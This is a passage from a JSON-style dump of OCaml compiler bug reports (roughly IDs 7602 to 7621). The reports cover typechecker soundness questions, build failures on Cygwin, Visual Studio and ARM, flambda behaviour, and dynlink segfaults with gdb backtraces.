[b.mli](https://gist.githubusercontent.com/vicuna/d43be2683941d0c473ca594843928f3c/raw/10f121404564b2fdc0bbb444829f9e53b1704264/b.mli)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7621\n**Reporter:** krark\n**Assigned to:** @dra27\n**Status:** resolved (set by @dra27 on 2017-09-06T10:20:08Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** block\n**Platform:** cygwin\n**OS:** Windows\n**OS Version:** 7\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** configure and build/install\n\n## Bug description\n\nAs a last resort I tried every example configuration provided in the install instructions.  The most common error that seems to get the furthest in the build process is reproducible when just running \"./configure\".\r\n\r\nThis is the error:\r\n\r\nunix.c:317:8: error: conflicting types for 'caml_dlsym'\r\n void * caml_dlsym(void * handle, char * name)\r\n        ^\r\nIn file included from unix.c:53:0:\r\ncaml/osdeps.h:72:15: note: previous declaration of 'caml_dlsym' was here\r\n extern void * caml_dlsym(void * handle, const char * name);\r\n               ^\r\nunix.c:322:8: error: conflicting types for 'caml_globalsym'\r\n void * caml_globalsym(char * name)\r\n        ^\r\nIn file included from unix.c:53:0:\r\ncaml/osdeps.h:74:15: note: previous declaration of 'caml_globalsym' was here\r\n extern void * caml_globalsym(const char * name);\r\n               ^\r\nmake[1]: *** [Makefile:195: unix.o] Error 1\r\nmake[1]: Leaving directory '/cygdrive/d/downloads/Apps/llpp/ocaml/byterun'\r\nmake: *** [Makefile:372: coldstart] Error 2\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7620\n**Reporter:** furuse\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-09-12T23:38:15Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** compiler driver\n\n## Bug description\n\nThe following program passes  ocamlc -i, but not ocamlc:\r\n\r\n----------\r\nlet t = \r\n  (function `A | `B -> () : 'a) (`A : [`A]);\r\n  (failwith \"dummy\" : 'a)  (* to know how 'a is unified *)\r\n----------\r\n\r\nWith ocamlc -i,\r\n\r\n----------\r\nval t : [ `A ] -> unit\r\n----------\r\n\r\nbut with ocamlc\r\n\r\n----------\r\nFile \"x.ml\", line 2, characters 17-19:\r\nError: This pattern matches values of type [? `B ]\r\n       but a pattern was expected which matches values of type [ `A ]\r\n       The second variant type does not allow tag(s) `B\r\n----------\r\n\r\nThis is because Typecore.force_delayed_checks never runs when -i option is given. \r\n\r\nThere is another issue of Typecore.force_delayed_checks: it runs only after printing the module signature in Compile.interface and Optcompile.interface.\r\n\r\nI think they are bugs, but are they done intentionally?  Even if they are intentional, Typecore.force_delayed_checks must run after printing the signatures for ocamlc -i.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7619\n**Reporter:** ChriChri\n**Status:** resolved (set by @xavierleroy on 2017-10-18T15:11:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** lexing and parsing\n**Monitored by:** ChriChri @gasche\n\n## Bug description\n\nCompiling the following\r\n\r\nlet f x y = x y; x y;\r\n\r\nProduce the following position for the first application:\r\n\r\n              expression (tmp2.ml[1,0+12]..[1,0+15])\r\n                Pexp_apply\r\n\r\nAnd this for the second:\r\n\r\n              expression (tmp2.ml[1,0+17]..[1,0+21])\r\n                Pexp_apply\r\n\r\nThe semicolumn is part of the last application, which look wrong\n\n## Steps to reproduce\n\ncompile the above line with -dparsetree\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7618\n**Reporter:** @trefis\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-09-12T23:34:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Child of:** #7617\n**Monitored by:** @gasche\n\n## Bug description\n\nCurrently the following code is rejected by the typechecker:\r\n\r\n    # type _ t = I : int t\r\n    type _ t = I : int t\r\n    # let f (type a) (x : a t) (y : int) =\r\n        match x, y with\r\n        | I, (_:a) -> ()\r\n      ;;\r\n    Error: This pattern matches values of type a t * a\r\n           but a pattern was expected which matches values of type a t * int\r\n           Type a is not compatible with type int\r\n\r\nWhile this one is accepted:\r\n\r\n    # let g (type a) (x : a t) (y : a) =\r\n        match x, y with\r\n        | I, (0:int) -> ()\r\n      ;;\r\n    val g : 'a t -> 'a -> unit\r\n\r\nI believe that both of these function suffer from the issue raised in #7617,\r\ni.e. the typechecker allows ambiguous types to escape, arbitrarily choosing one\r\nof the instances as the type of the pattern (or rather, always choosing the\r\nlocally abstract type).\r\n\r\n[f] later fails to typecheck because we try to unify the type of the pattern\r\nwith the type of the argument outside the scope of the equation introduced by\r\n[I].\r\nThis happens on line 3887 of typecore.ml, with the call to\r\n[unify_pats (instance env ty_arg)].\r\n\r\nOnce #7617 is fixed, everything else being unchanged, these functions should\r\nboth be rejected.\r\nHowever Leo suggests they could be accepted that the typechecker if we decreased\r\nthe sharing between the type of the scrutiny and the expected type of each\r\npattern (eg. by using generalize_structure).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7617\n**Reporter:** @trefis\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-09-12T23:34:27Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Parent of:** #7618\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nThe following example typechecks properly:\r\n\r\n    # type ('a, 'b) eq = Refl : ('a, 'a) eq;;\r\n    type ('a, 'b) eq = Refl : ('a, 'a) eq\r\n    # let ok (type a b) (x : (a, b) eq) =\r\n        match x, [] with\r\n        | Refl, [(_ : a) | (_ : b)] -> []\r\n      ;;\r\n    val ok : ('a, 'b) eq -> 'c list\r\n\r\nBut I claim it shouldn't as the typechecker will have chosen an arbitrary rigid\r\ntype for the ambivalent pattern [(_ : a) | (_ : b)].\r\n\r\nThis is made more apparent with the following examples:\r\n\r\n    # let oks (type a b) (x : (a, b) eq) =\r\n        match x, [] with\r\n        | Refl, [(_ : a) | (_ : b)] -> []\r\n        | Refl, [(_ : a) | (_ : b)] -> []\r\n      ;;\r\n    val oks : ('a, 'b) eq -> 'c list\r\n    # let fails (type a b) (x : (a, b) eq) =\r\n        match x, [] with\r\n        | Refl, [(_ : a) | (_ : b)] -> []\r\n        | Refl, [(_ : b) | (_ : a)] -> []\r\n      ;;\r\n    Error: This pattern matches values of type (a, b) eq * b list\r\n           but a pattern was expected which matches values of type\r\n             (a, b) eq * a list\r\n           Type b is not compatible with type a\r\n\r\nN.B. this happens both with and without -principal.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7616\n**Reporter:** freyr\n**Status:** resolved (set by @damiendoligez on 2017-10-02T12:16:42Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** linux x86_64\n**OS:** fedora 26\n**OS Version:** 4.12.8-300.fc26\n**Version:** 4.04.2\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nCompiler emits warning 59 being emitted when I assign array to ref. \r\n`x := [||];` works fine, but `x := CCArray.filter_map filter !x;` \r\n(CCArray.filter_map from containers package [1]) emits warning 59 (A potential assignment to a non-mutable value was detected)\r\n\r\n1. https://opam.ocaml.org/packages/containers/\n\n## Steps to reproduce\n\n1) compiler: 4.04.2 + flambda\r\n\r\n2) set -O3 flag\r\n\r\n3) compile a trivial program containing `x := CCArray.filter_map filter !x;`\n\n## Additional information\n\nTrivial example with the corresponded Makefile is attached\n\n## File attachments\n\n- [test.tar.gz](https://gist.githubusercontent.com/vicuna/51a8e151c053f3602d1e69209c25be60/raw/6fd57435320b71d5cfd7dbb39656bd0c6e792dc1/test.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7615\n**Reporter:** schommer\n**Assigned to:** @dra27\n**Status:** resolved (set by @xavierleroy on 2017-10-09T18:26:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @gasche\n\n## Bug description\n\nI'm unable to compile ocaml with the latest visual studio 2017 release. The problem seems to be that the generated: dyndll_implib.lib is a not a valid file. During the linking of for example the unix library the following error is reported:\r\n\r\n../../boot/ocamlrun ../../tools/ocamlmklib -oc unix accept.obj bind.obj channels.obj close.obj close_on.obj connect.obj createprocess.obj dup.obj dup2.obj errmsg.obj getpeername.obj getpid.obj getsockname.obj gettimeofday.obj link.obj listen.obj lockf.obj lseek.obj nonblock.obj mkdir.obj open.obj pipe.obj read.obj readlink.obj rename.obj select.obj sendrecv.obj shutdown.obj sleep.obj socket.obj sockopt.obj startup.obj stat.obj symlink.obj system.obj times.obj unixsupport.obj windir.obj winwait.obj write.obj winlist.obj winworker.obj windbug.obj access.obj addrofstr.obj chdir.obj chmod.obj cst2constr.obj cstringv.obj envir.obj execv.obj execve.obj execvp.obj exit.obj getaddrinfo.obj getcwd.obj gethost.obj gethostname.obj getnameinfo.obj getproto.obj getserv.obj gmtime.obj putenv.obj rmdir.obj socketaddr.obj strofaddr.obj time.obj unlink.obj utimes.obj -ldopt ws2_32.lib -ldopt advapi32.lib -v\r\n+ ..\\..\\boot\\ocamlrun ..\\..\\flexdll\\flexlink.exe -x64 -merge-manifest -stack 33554432  -o .\\dllunix.dll accept.obj bind.obj channels.obj close.obj close_on.obj connect.obj createprocess.obj dup.obj dup2.obj errmsg.obj getpeername.obj getpid.obj getsockname.obj gettimeofday.obj link.obj listen.obj lockf.obj lseek.obj nonblock.obj mkdir.obj open.obj pipe.obj read.obj readlink.obj rename.obj select.obj sendrecv.obj shutdown.obj sleep.obj socket.obj sockopt.obj startup.obj stat.obj symlink.obj system.obj times.obj unixsupport.obj windir.obj winwait.obj write.obj winlist.obj winworker.obj windbug.obj access.obj addrofstr.obj chdir.obj chmod.obj cst2constr.obj cstringv.obj envir.obj execv.obj execve.obj execvp.obj exit.obj getaddrinfo.obj getcwd.obj gethost.obj gethostname.obj getnameinfo.obj getproto.obj getserv.obj gmtime.obj putenv.obj rmdir.obj socketaddr.obj strofaddr.obj time.obj unlink.obj utimes.obj  ws2_32.lib advapi32.lib   -LR:\\usr\\20170829\\130101\\release\\win64\\lib\\ocaml\\flexdll\r\n   Bibliothek \"D:\\cygdrive\\tmp\\dyndll_implib25d6f4.lib\" und Objekt \"D:\\makefactory\\d633fcee-7987-486e-808e-e1b5081ae129\\tmp\\dyndll_implib25d6f4.exp\" werden erstellt.\r\nD:\\makefactory\\d633fcee-7987-486e-808e-e1b5081ae129\\tmp\\dyndll_implib25d6f4.lib : fatal error LNK1136: illegal or corrupt file.\r\n** Fatal error: Error during linking\n\n## Steps to reproduce\n\nHappens during execution of make world.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7614\n**Reporter:** Alex\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2017-09-04T13:53:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @ygrek @hcarty @Yakobowski\n\n## Bug description\n\nOptimization decisions made by flambda are very fragile and sometimes depends on unrelated things.\r\nI found the case where inline decisions can be due to source file renaming or even just adding some empty lines to the source, resulting in code size increase and suboptimal performance:\r\n\r\n$ ls\r\nfragile.ml\r\n$ cp fragile.ml fragile2.ml\r\n$ md5sum *\r\n6a13d560736c81b3e5b5dfe7f13c2f56  fragile2.ml\r\n6a13d560736c81b3e5b5dfe7f13c2f56  fragile.ml\r\n$ ocamlopt -version\r\n4.05.0\r\n$ ocamlopt -O3 fragile.ml -dflambda 2>&1 | wc -l\r\n1774\r\n$ ocamlopt -O3 fragile2.ml -dflambda 2>&1 | wc -l\r\n3835\n\n## File attachments\n\n- [fragile.ml](https://gist.githubusercontent.com/vicuna/0de0fa6fea68b93628933771bbcef21f/raw/1ca6858185b31459ada37bb52e3a668fb851ebe6/fragile.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7613\n**Reporter:** coventry\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-04-01T14:04:53Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n\n## Bug description\n\nCurrently this section: https://caml.inria.fr/pub/docs/manual-ocaml/extn.html#sec241\r\n\r\nThe \"and redundancy\" in the title makes it sound like refutation cases are something defined elsewhere, and have some relationship to GADTs via redundancy. The fact that redundancy isn't mentioned anywhere in the section is also confusing -- I think it means branches of a pattern match which are redundant due to being untypable. \"which are both untypable\" would be clarified by adding \"because deep expects a [char t]\".\r\n\r\nMy confusion was cleared up by https://discuss.ocaml.org/t/matching-incompatible-gadt-constructors/682 , FWIW. I think it's much clearer.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7612\n**Reporter:** talex\n**Assigned to:** @stedolan\n**Status:** resolved (set by @xavierleroy on 2017-10-11T09:21:16Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche @yallop @hcarty @Yakobowski\n\n## Bug description\n\nThe program:\r\n\r\nlet () = AflPersistent.run (fun () -> ignore (object end))\r\n\r\nshould behave the same every time it is run. Instead, AFL reports: \"stability : 16.00%\"\r\n\r\nThe AFL docs say:\r\n\r\n> If a program always behaves the same for the same input data, it will earn a score of 100%.\r\n\r\nI believe this means that AFL thinks it is finding new paths when it isn't, making the fuzzing inefficient.\r\n\r\nStephen Dolan said (https://ocamllabs.slack.com/archives/C0QBB5457/p1497434875205918):\r\n\r\n> Hmm. Looking at the Cmm, that program does indeed seem to have some state (!)\r\nThere's a lazily initialised table per class, and a branch to see whether it has already been initialised.\r\n[...]\r\n> The bug is indeed the lazy initialisation of classes being picked up by afl-fuzz, and the fix is to ensure that this code is not instrumented. However, class initialisation is pretty hairy, with a bunch of different paths depending on whether the class closes over values, etc.\n\n## Steps to reproduce\n\ndocker run --rm -it ocaml/opam:debian-9_ocaml-4.05.0\r\nopam sw 4.05.0+afl\r\neval `opam config env`\r\nopam install afl-persistent\r\nocamlfind ocamlopt -package afl-persistent -linkpkg test.ml\r\nsudo apt-get install afl --no-install-recommends\r\nmkdir in; echo > in/empty\r\nafl-fuzz -i in -o out ./a.out \r\n\r\nAFL reports \"stability : 16.00%\"\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7611\n**Reporter:** lavi\n**Assigned to:** @garrigue\n**Status:** resolved (set by @Octachron on 2017-12-13T19:52:31Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Related to:** #7726\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nin type expression, it is possible to use generative functors as applicative:\r\n\r\nmodule F () = struct type t end\r\nlet f (x: F(List).t) (y: F(List).t) = x=y\r\n\r\nEven if safe, I would expect the above program to be rejected !\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7610\n**Reporter:** sebmondet\n**Status:** resolved (set by @xavierleroy on 2017-09-30T14:26:50Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** Emacs 25\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** emacs mode\n\n## Bug description\n\nThe `last-command-char` variable does not exist any more in Emacs ? 25.\r\n\r\nIt's used in `caml-abbrev-hook`:\r\nhttps://github.com/ocaml/ocaml/blob/trunk/emacs/caml.el#L1767\r\n\r\nSee also https://emacs.stackexchange.com/questions/27920/symbol-s-value-as-variable-is-void-last-command-char-when-trying-to-insert-brac\n\n## Steps to reproduce\n\nType a keyword like `in` and then an Emacs command.\n\n## Additional information\n\nBypassed the problem with:\r\n\r\n    (defun caml-abbrev-hook () (progn (message \"abbrev-caml\")))\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7609\r\n**Reporter:** @psteckler\r\n**Assigned to:** @xavierleroy\r\n**Status:** resolved (set by @xavierleroy on 2017-09-23T16:12:24Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** major\r\n**Platform:** PC\r\n**OS:** Linux Mint x64 (Cinnamon)\r\n**OS Version:** 18\r\n**Version:** 4.04.0\r\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\r\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\r\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\r\n\r\n## Bug description\r\n\r\nA recent change in the Coq sources results in coqtop.byte to hang when run from ocamldebug. The startup banner appears, then ... nothing. For me, this behavior happens 100% of the time. Running coqtop.byte from the command line works fine.\r\n\r\nThe Coq sources are (of course) at:\r\n\r\n  https://github.com/coq/coq\r\n\r\nA recent commit that shows the behavior is 16b0b83. A git bisect reveals that the behavior started with commit c3ca30ca41. \r\n\r\nI provided a (yet-unmerged) PR to restore the old behavior at https://github.com/coq/coq/pull/977.\r\n\r\nAll that the PR code does is run a Gc.minor and Gc.allocated_bytes at the toplevel of an OCaml module. Why that makes a difference isn't clear.\r\n\r\nMaybe this is a bug in Coq (perhaps some C code is corrupting the heap in a way that a collection masks), but maybe it's something about how ocamldebug runs the byte code.\r\n\r\nPerhaps the OCaml team has some insight.\r\n\r\n## Steps to reproduce\r\n\r\nOn Linux x64, clone the Coq repo (probably the bug shows up using the tip, but you could reset to the commit mentioned above).\r\n\r\nIn the coq directory:\r\n\r\n ./configure -local\r\n make -j && make -j byte\r\n ocamldebug ./bin/coqtop.byte -coqlib `pwd`\r\n\r\nIf the bug is present, you'll see a startup banner, and the prompt will not appear.\r\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7608\n**Reporter:** SP\n**Assigned to:** @xavierleroy\n**Status:** assigned (set by @xavierleroy on 2017-10-13T13:03:53Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** ARM\n**OS:** Archlinux\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche\n\n## Bug description\n\nI have the following compilation error with another ARM chip.\r\n\r\nA key part seems to be this:\r\n```\r\n/tmp/camlasm480e0c.s: Assembler messages:\r\n/tmp/camlasm480e0c.s:52: Error: value of 68249 too large for field of 2 bytes at 30\r\n/tmp/camlasm480e0c.s:73426: Error: value of 68255 too large for field of 2 bytes at 204542\r\n```\r\n\r\nLog file cropped to relevant section:\r\n\r\n\r\n```\r\nFile \"lib/uri.ml\", line 306, characters 33-50:\r\nWarning 52: Code should not depend on the actual values of\r\nthis constructor's arguments. They are only for information\r\nand may change in future versions. (See manual section 8.5)\r\nFile \"lib/uri.ml\", line 321, characters 27-44:\r\nWarning 52: Code should not depend on the actual values of\r\nthis constructor's arguments. They are only for information\r\nand may change in future versions. (See manual section 8.5)\r\nFile \"lib/uri.ml\", line 568, characters 17-33:\r\nWarning 3: deprecated: String.lowercase\r\nUse String.lowercase_ascii instead.\r\n    ocamlopt lib/uri_top.{cmx,o}\r\nFile \"_none_\", line 1:\r\nWarning 58: no cmx file was found in path for module Toploop, and its interface was not compiled with -opaque\r\n    ocamlopt etc/uri_services.{cmx,o}\r\n    ocamlopt lib/uri.{a,cmxa}\r\n    ocamlopt lib/uri_top.{a,cmxa}\r\n    ocamlopt etc/uri_services.{a,cmxa}\r\n    ocamlopt lib/uri.cmxs\r\n    ocamlopt lib/uri_top.cmxs\r\n    ocamlopt etc/uri_services.cmxs\r\n      ocamlc etc/uri_services_full.{cmo,cmt}\r\n      ocamlc etc/uri_services_full.cma\r\n    ocamlopt etc/uri_services_full.{cmx,o} (exit 2)\r\n(cd _build/default && /usr/bin/ocamlopt.opt -w -40 -g -I /home/fox/.opam/system/lib/bytes -I /home/fox/.opam/system/lib/re -I /home/fox/.opam/system/lib/sexplib -I /home/fox/.opam/system/lib/sexplib/0 -I /home/fox/.opam/system/lib/stringext -I /usr/lib/ocaml -I lib -no-alias-deps -I etc -o etc/uri_services_full.cmx -c -impl etc/uri_services_full.ml)\r\n/tmp/camlasm480e0c.s: Assembler messages:\r\n/tmp/camlasm480e0c.s:52: Error: value of 68249 too large for field of 2 bytes at 30\r\n/tmp/camlasm480e0c.s:73426: Error: value of 68255 too large for field of 2 bytes at 204542\r\n/tmp/camlasm480e0c.s:148307: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188181: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148267: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148274: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148295: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148299: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148303: Error: offset out of range\r\n/tmp/camlasm480e0c.s:148320: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188141: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188148: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188169: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188173: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188177: Error: offset out of range\r\n/tmp/camlasm480e0c.s:188194: Error: offset out of range\r\nFile \"etc/uri_services_full.ml\", line 1:\r\nError: Assembler error, input left in file /tmp/camlasm480e0c.s\r\n```\r\n\r\nRelated issue on ocaml-uri: https://github.com/mirage/ocaml-uri/issues/106\n\n## Steps to reproduce\n\nBuild ocaml-uri on ARM.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7607\n**Reporter:** kosik\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-08-17T13:23:03Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** ocamldoc\n**Duplicate of:** #7606\n\n## Bug description\n\nIf I have \"a.mli\" file with the following contents:\r\n\r\n  module D : B.C\r\n\r\nand a \"b.mli\" file with the following contents:\r\n\r\n  include\r\n    sig\r\n      module type C = sig end\r\n    end\r\n\r\nthen both files compile fine:\r\n\r\n  ocamlfind c -bin-annot -o b.cmi b.mli\r\n  ocamlfind c -bin-annot -o a.cmi a.mli\r\n\r\nHowever, when I try to use ocamldoc like this:\r\n\r\n  ocamlfind doc -html a.mli b.mli\r\n\r\nI get the following warning:\r\n\r\n  Warning: Module type B.C not found\r\n  Warning: Module or module type ?? not found\r\n  Warning: Module type B.C not found\r\n\r\nI am guessing that this is an unexpected behavior\r\n(since both files are valid and compilable).\n\n## Steps to reproduce\n\ntar xvzf 1.tar.gz\r\ncd 1\r\nmake\n\n## File attachments\n\n- [1.tar.gz](https://gist.githubusercontent.com/vicuna/1130a069e7ec44450a2484effeda0f48/raw/41093784127d487ff1f1475131a4b6f9e4c1f00b/1.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7605\n**Reporter:** rlepigre\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2017-08-16T10:58:52Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** language features\n**Monitored by:** @gasche\n\n## Bug description\n\nThe definition of a GADT using an abstract type from some module is rejected with the error \"In this definition, a type variable cannot be deduced from the type parameters.\". Here is a minimal example.\r\n\r\n##########\r\nmodule B : sig type ('a,'b) t end =\r\n  struct\r\n    type ('a,'b) t = 'a -> 'b\r\n  end\r\n\r\ntype _ s = U : unit s\r\n\r\ntype _ q = Last : 'c s * ('c, 'b) B.t -> ('c, 'b) B.t q\r\n##########\r\n\r\nIf the signature of the module B is removed, it is accepted.\n\n## Additional information\n\nThis example still fails using OCaml 4.05.0.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7604\n**Reporter:** miod\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2017-08-16T11:20:42Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** documentation\n**Monitored by:** @gasche\n\n## Bug description\n\npdf generated documentation for module Ephemeron has a duplicated sentence, and a word gets omitted, which causes a sentence to lose its meaning.\r\n\r\nSuggested fix is attached.\n\n## File attachments\n\n- [ephemeron.mli.diff](https://gist.githubusercontent.com/vicuna/5fa86b62489ad3d560273e0074a81822/raw/43b2b366c16ac95d976151ade8245ce6152d9e39/ephemeron.mli.diff)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7603\n**Reporter:** dwight.guth\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-10-04T14:15:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** Windows Cygwin\n**Version:** 4.04.2\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nI have an OCAML program that I am trying to port to Windows (using the cygwin version of OCAML), and when it executes, it segfaults. I haven't been able to completely track down the cause of the error, but below is the stack trace in gdb, and I have been able to determine that adjusting the inlining settings seems to be capable of suppressing the bug, so I suspect that the issue is in the middle-end somewhere. I tried reducing the program further but it seems like the bug seems to only arise when the program reaches a certain point of complexity, so unfortunately the steps to reproduce the issue are a little involved.\r\n\r\n#0  0x62c7e1c8 in camlRealdef__entry () from /home/dwightguth/rv-match/c-semantics/semantics/x86-gcc-limited-libc/cpp14-translation-kompiled/cpp14-translation-kompiled/program/realdef.cmxs\r\n#1  0x0051d8e9 in caml_start_program ()\r\n#2  0x00519617 in caml_callback ()\r\n#3  0x0051d520 in caml_natdynlink_run ()\r\n#4  0x0049ad25 in camlDynlink__fun_3854 () at dynlink.mlopt:176\r\n#5  0x004a3739 in camlList__iter_1258 () at list.ml:77\r\n#6  0x0049b285 in camlDynlink__loadunits_3569 () at dynlink.mlopt:179\r\n#7  0x0049b315 in camlDynlink__load_3582 () at dynlink.mlopt:185\r\n#8  0x00404f19 in camlPlugin__load_2861 ()\r\n#9  0x00404e5b in camlInterpreter__entry ()\r\n#10 0x00401fd0 in caml_startup.code_begin ()\r\n#11 0x0051d8e9 in caml_start_program ()\r\n#12 0x00506ef5 in caml_main ()\r\n#13 0x0051e599 in main ()\n\n## Steps to reproduce\n\n1. install ocaml on Cygwin with ocamlfind and zarith and mlgmp packages\r\n\r\n2. \r\n\r\n$ tar xvf program.tar.gz\r\n$ cd program\r\n$ make\r\n$ ./interpreter.exe ./realdef.cma\r\n\r\nThis should complete successfully, but instead it triggers a segmentation fault.\n\n## File attachments\n\n- [program.tar.gz](https://gist.githubusercontent.com/vicuna/940485363e6d9753bfe2671a30948119/raw/85ecd443025a59753089a57bcb67f233e977463d/program.tar.gz)\n- [program2.tar.gz](https://gist.githubusercontent.com/vicuna/940485363e6d9753bfe2671a30948119/raw/a1040f754af431351f804fbc062b086195b71c85/program2.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7602\r\n**Reporter:** @rwmjones \r\n**Assigned to:** @gasche\r\n**Status:** resolved (set by @gasche on 2017-08-05T13:00:39Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Platform:** aarch64\r\n**OS:** Linux\r\n**Version:** 4.05.0\r\n**Category:** misc\r\n**Duplicate of:** #7585\r\n\r\n## Bug description\r\n\r\nI'm running the test suite on aarch64 with the very latest gcc, glibc and binutils:\r\n\r\ngcc-7.1.1-7.fc27.1.aarch64\r\nglibc-2.26-1.fc27.1.aarch64\r\nbinutils-2.29-6.fc27.aarch64\r\n\r\nand it crashes in the test suite.  For crash details, see below.\r\n\r\nThis worked before I upgraded those packages.  I suspect either glibc or binutils are really to blame here and it may not be OCaml at all, so this is mainly a \"heads up\" that something is going on.\r\n\r\nReading symbols from /home/rjones/d/fedora-ocaml/testsuite/tests/lib-dynlink-native/main...done.\r\n[New LWP 32284]\r\n[Thread debugging using libthread_db enabled]\r\nUsing host libthread_db library \"/lib64/libthread_db.so.1\".\r\nCore was generated by `./main plugin.so plugin2.so plugin_thread.so'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x0000ffff8954d0e4 in camlPlugin__entry ()\r\n   from /home/rjones/d/fedora-ocaml/testsuite/tests/lib-dynlink-native/plugin.so\r\n(gdb) bt\r\n#0  0x0000ffff8954d0e4 in camlPlugin__entry ()\r\n   from /home/rjones/d/fedora-ocaml/testsuite/tests/lib-dynlink-native/plugin.so\r\n#1  0x00000000004bfe3c in caml_start_program ()\r\n#2  0x00000000004bab64 in caml_callback (\r\n    closure=closure@entry=281474943984712, arg=arg@entry=0) at callback.c:173\r\n#3  0x00000000004bf8ac in caml_natdynlink_run (handle_v=<optimized out>, \r\n    symbol=<optimized out>) at natdynlink.c:141\r\n#4  0x00000000004bfdac in caml_c_call ()\r\nBacktrace stopped: previous frame identical to this frame (corrupt stack?)\r\n\r\nDump of assembler code for function camlPlugin__entry:\r\n   0x0000ffff8954d0d0 <+0>:\tsub\tsp, sp, #0x20\r\n   0x0000ffff8954d0d4 <+4>:\tstr\tx30, [sp, #24]\r\n   0x0000ffff8954d0d8 <+8>:\tadrp\tx0, 0xffff8956c000\r\n   0x0000ffff8954d0dc 